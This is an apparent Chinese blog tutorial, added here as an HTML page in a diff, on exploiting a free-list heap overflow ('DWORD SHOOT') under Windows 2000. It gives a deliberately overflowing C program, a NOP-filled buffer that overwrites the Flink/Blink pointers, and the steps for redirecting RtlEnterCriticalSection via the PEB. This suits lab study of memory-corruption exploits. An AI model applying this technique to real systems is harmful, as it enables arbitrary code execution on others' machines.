@@ -1,0 +1,534 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>堆溢出（二）空表 DWORD SHOOT | Reshahar的博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="Reshahar">
+    
+
+    
+    <meta name="description" content="本系列文章讲述了windows 2000 下 堆溢出的方法">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="堆溢出（二）空表 DWORD SHOOT">
+<meta property="og:url" content="http://Reshahar.github.io/2017/04/13/堆溢出（二）空表DWORD SHOOT/index.html">
+<meta property="og:site_name" content="Reshahar的博客">
+<meta property="og:description" content="本系列文章讲述了windows 2000 下 堆溢出的方法">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318220830850?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318220855835?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318220917724?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318220943005?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318221007415?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318221209757?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318221234382?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318221301273?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318221331492?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318221353070?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318221429961?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318221448242?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318221508758?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170318221524649?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:updated_time" content="2017-04-13T13:53:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="堆溢出（二）空表 DWORD SHOOT">
+<meta name="twitter:description" content="本系列文章讲述了windows 2000 下 堆溢出的方法">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20170318220830850?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Reshahar的博客" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="Reshahar的博客" title="Reshahar的博客"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Reshahar的博客">Reshahar的博客</a></h1>
+				<h2 class="blog-motto">世界上没有绝对安全的系统</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">主页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/">关于</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:Reshahar.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/04/13/堆溢出（二）空表DWORD SHOOT/" title="堆溢出（二）空表 DWORD SHOOT" itemprop="url">堆溢出（二）空表 DWORD SHOOT</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/" title="Reshahar" target="_blank" itemprop="author">Reshahar</a>
+		
+  <p class="article-time">
+    <time datetime="2017-04-13T13:04:32.000Z" itemprop="datePublished"> 发表于 2017-04-13</time>
+      
+     &nbsp
+     <span id="busuanzi_container_page_pv" style="display:none">
+    阅读<span id="busuanzi_value_page_pv"></span>次
+    </span>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			
+		
+		</div>
+		
+		<p>本系列文章讲述了windows 2000 下 堆溢出的方法</p>
+<hr>
+<a id="more"></a>
+<p>###0x000 环境</p>
+<ol>
+<li>虚拟机     VirtualBox 5.0.20</li>
+<li>系统        windows 2000     Kali linux</li>
+<li>工具        VC++6.0    OllyDbg 1.10 汉化版     AsmToE v5.20</li>
+</ol>
+<p>###0x001堆溢出之空表</p>
+<ol>
+<li><p>代码</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="number">2.</span>	#include &lt;stdio.h&gt;  </div><div class="line"><span class="number">3.</span>	#include &lt;windows.h&gt;  </div><div class="line"><span class="number">4.</span>	  </div><div class="line"><span class="number">5.</span>	int main()  </div><div class="line"><span class="number">6.</span>	&#123;  </div><div class="line"><span class="number">7.</span>	    HANDLE hp;  </div><div class="line"><span class="number">8.</span>	    HLOCAL h1,h2,h3;  </div><div class="line"><span class="number">9.</span>	    char * buf;  </div><div class="line"><span class="number">10.</span>	  </div><div class="line"><span class="number">11.</span>	  </div><div class="line"><span class="number">12.</span>	    hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);  </div><div class="line"><span class="number">13.</span>	  </div><div class="line"><span class="number">14.</span>	    __asm int <span class="number">3</span>  </div><div class="line"><span class="number">15.</span>	  </div><div class="line"><span class="number">16.</span>	    buf = (char *)HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);  </div><div class="line"><span class="number">17.</span>	    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);  </div><div class="line"><span class="number">18.</span>	    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);  </div><div class="line"><span class="number">19.</span>	      </div><div class="line"><span class="number">20.</span>	    HeapFree(hp,<span class="number">0</span>,h1);  </div><div class="line"><span class="number">21.</span>	      </div><div class="line"><span class="number">22.</span>	    strcpy(buf,<span class="string">"AAAAAAAABBBBBBBBCCCCDDDD"</span>); </div><div class="line"><span class="number">23.</span>	<span class="comment">//buf大小为8,而字符串的长度是('A'*8+'B'*8+'C'*4+'D'*4)24</span></div><div class="line"><span class="number">24.</span>	<span class="comment">//,这里会产生溢出  </span></div><div class="line"><span class="number">25.</span>	<span class="comment">//其中'A'覆盖buf申请的空间，而'B'会覆盖下一个堆块的头（这里）  </span></div><div class="line"><span class="number">26.</span>	 h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>); <span class="comment">//DWORD SHOOT  </span></div><div class="line"><span class="number">27.</span>	  return <span class="number">0</span>;  </div><div class="line"><span class="number">28.</span>	&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>空表溢出原理及现象分析<br>a)    编译程序，运行等等我在这里就不一一赘述了，上篇文章已经写的很明白了，溢这里主要就是讲堆出的原理和利用的方式。<br>b)    首先运行上面的程序，程序崩溃，进入OD调试，这和上篇文章的操作一样，断点的位置都是一样的，转到堆上。<br><img src="http://img.blog.csdn.net/20170318220830850?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>c)    单步调试，直到堆块分配完毕，一共分配三块堆块（这是有原因的，首先堆是初始化的状态，所有分配的堆块都是从“尾块”分配，分配的地址是连续的，这对后期的堆溢出有很大帮助），从下图可以验证上述所说的内容，其中上面的就是三块新分配的堆块，下面的是尾块。<br><img src="http://img.blog.csdn.net/20170318220855835?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>d)    继续单步调试结合源代码可以看出来，将第二块的堆块释放了，他被链接到了空表free<a href="《软件调试》张银奎">2</a>的上了，而这块堆块正是要被溢出的堆块，（同时这里解释一下第三个堆块的作用，防止发生堆块合并，如果没有第三块，那么在第二块的释放后，第二块会和后面的堆块发生合并，变成新的“尾块”，这里虽然不会影响堆溢出，但是现象不如现在的结果明显），具体现象如下图，其中选中部分是第二堆块，红色框分别为Flink和Blink指针。<br><img src="http://img.blog.csdn.net/20170318220917724?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>e)    结合源代码可以看出来之后调用了strcpy函数，从分配的堆块大小可以看出发生了溢出，同时我也在旁边的位置标注了注释，可以很清楚的看出，溢出的位置和对应位置的数据，单步直到复制完毕，可以看到下图的变化，选中的部分是复制的数据，对比上面的图，可以看出来43（’C’）的位置就是Flink，而44(‘D’）就是Blink。<br><img src="http://img.blog.csdn.net/20170318220943005?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>f)    下面直接运行程序，程序会断在下面的位置，我在这些位置做了注释，大家可以对照着看，分析一下堆块卸载的过程，可以分析出来，在堆块卸载的过程会将节点Flink的值写入Blink所指向的地址。<br><img src="http://img.blog.csdn.net/20170318221007415?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
+</li>
+<li>总结<br>通过对上面的小程序的调试和分析，我们从源代码和汇编的角度清楚的明白了空表溢出的原理及现象，并且可以知道空表堆溢出会造成一次任意地址写。<br>###0x002 DWROD SHOOT代码植入</li>
+<li>修改代码<br>将上面的代码修改成下面这样，大家可以结合注释来看，这个程序运行之后，附加调试器，最后会断在和上面程序一样的地址，就是要将43434343 写入地址44444444，这里的地址是不访问的所以断了下来，我们可以将44444444换成程序可以写入的地址，再将43434343设置成要写入的数据（比如shellcode的地址等），就可以完成DWORD SHOOT。(其中\x90 对应的指令是nop，跳到shellcode 中就可以滑行了)</li>
+</ol>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">1.	#include &lt;stdio.h&gt;  </div><div class="line">2.	#include &lt;windows.h&gt;  </div><div class="line">3.	  </div><div class="line">4.	char shellcode[]=  </div><div class="line">5.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"      //每行15个字节 一共304个<span class="symbol">\x</span>90用来填充新申请的堆块，这里有个对齐  </div><div class="line">6.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">7.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">8.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">9.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">10.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">11.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">12.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">13.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">14.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">15.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">16.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">17.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">18.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">19.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">20.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">21.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">22.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">23.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">24.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">25.	"<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90<span class="symbol">\x</span>90"  </div><div class="line">26.	"<span class="symbol">\x</span>41<span class="symbol">\x</span>41<span class="symbol">\x</span>41<span class="symbol">\x</span>41<span class="symbol">\x</span>41<span class="symbol">\x</span>41<span class="symbol">\x</span>41<span class="symbol">\x</span>41"      //  下一个堆块的头  </div><div class="line">27.	"<span class="symbol">\x</span>43<span class="symbol">\x</span>43<span class="symbol">\x</span>43<span class="symbol">\x</span>43"                      //Flink  </div><div class="line">28.	"<span class="symbol">\x</span>44<span class="symbol">\x</span>44<span class="symbol">\x</span>44<span class="symbol">\x</span>44"                      //Blink  </div><div class="line">29.	;  </div><div class="line">30.	  </div><div class="line">31.	int main()  </div><div class="line">32.	&#123;  </div><div class="line">33.	    HANDLE hp;  </div><div class="line">34.	    HLOCAL h1,h2,h3;  </div><div class="line">35.	    char * buf;  </div><div class="line">36.	      </div><div class="line">37.	  </div><div class="line">38.	    hp = HeapCreate(0,0x1000,0x10000);  </div><div class="line">39.	  </div><div class="line">40.	    __asm int 3  </div><div class="line">41.	  </div><div class="line">42.	    buf = (char *)HeapAlloc(hp,HEAP_ZERO_MEMORY,300);  </div><div class="line">43.	    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);   </div><div class="line">44.	    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);  </div><div class="line">45.	      </div><div class="line">46.	    HeapFree(hp,0,h1);   </div><div class="line">47.	      </div><div class="line">48.	    memcpy(buf,shellcode,0x200); //溢出点  </div><div class="line">49.	      </div><div class="line">50.	    h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); //DWORD SHOOT  </div><div class="line">51.	  </div><div class="line">52.	    return 0;  </div><div class="line">53.	&#125;</div></pre></td></tr></table></figure>
+<ol>
+<li>寻找DWORD SHOOT 地址<br>a)    确定DWORD SHOOT目标<br>《0day安全》中也说了很多的目标，我这里就选用这个函数RtlEnterCriticalSection（进入临界区的函数）为目标。<br>b)     通过OD确定RtlEnterCriticalSection地址<br>这里首先要了解一些知识（PEB和TEB）<br>PEB：进程环境块<br>TEB：线程环境块<br>（这里我也只说一些相关的知识，如果想深入理解个两个结构，可以上网搜索一些相关资料）<br>1）    首先和上面一样运行程序，调试，附加OD后会断下来，在寄存器窗口，可以看到FS寄存器它存储的就是TEB的地址<br><img src="http://img.blog.csdn.net/20170318221209757?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>2）    它在PEB偏移为0x20的位置，而PEB在TEB结构中偏移0x30的位置，我们来查看一下（在OD下面的command中输入 dd 7ffde000数据窗口就会显示对应的数据），如下图偏移0x30的值是0x7ffdf000<br><img src="http://img.blog.csdn.net/20170318221234382?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>3）    同上查看PEB（在command中输入dd 7ffdf000 ）的结果如下图，红框的地方就是RtlEnterCriticalSection的地址，它在PEB偏移0x20的位置<br><img src="http://img.blog.csdn.net/20170318221301273?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>c)    总结<br>至此，我们通过OD调试器找到了目标（RtlEnterCriticalSection）地址7ffdf020（当然在每个机子上地址将会不同，请大家自己动手调试），这里也记录一下 这个地址上的数据，在后面的时候会用到。</li>
+<li>查找shellcode的地址<br>因为最后shellcode 要复制到申请的第一个堆块中，所以找到第一个堆块的起始地址就行了，在我的电脑中的地址是0x00360688</li>
+<li>再次修改代码<br>将刚才得到的shellcode地址放到Flink的位置，将存放RtlEnterCriticalSection函数的地址放到Blink的位置，在将shellcode从开始第八个字节之后的任意一个字节改成”\xcc”（至于为什么是8个字节之后，一会我在后面解释），这样相当于int 3 断点，这样可以使程序断下来，便于我们观察，具体修改结果如下图。<br><img src="http://img.blog.csdn.net/20170318221331492?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></li>
+<li>验证DWORD SHOOT<br>重新编译后再次调试程序，我这里直接F9运行，结果断了下来，在查看存放RtlEnterCriticalSection函数的地址0x7ffdf020，可以看到这个地址现在存放的就是0x00360688，就是之前Flink的值，而程序也跳的shellcode去执行了，这些都证明了DWORD SHOOT成功了，具体结果如下图。<br><img src="http://img.blog.csdn.net/20170318221353070?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></li>
+<li>完善生成并替换shellcode</li>
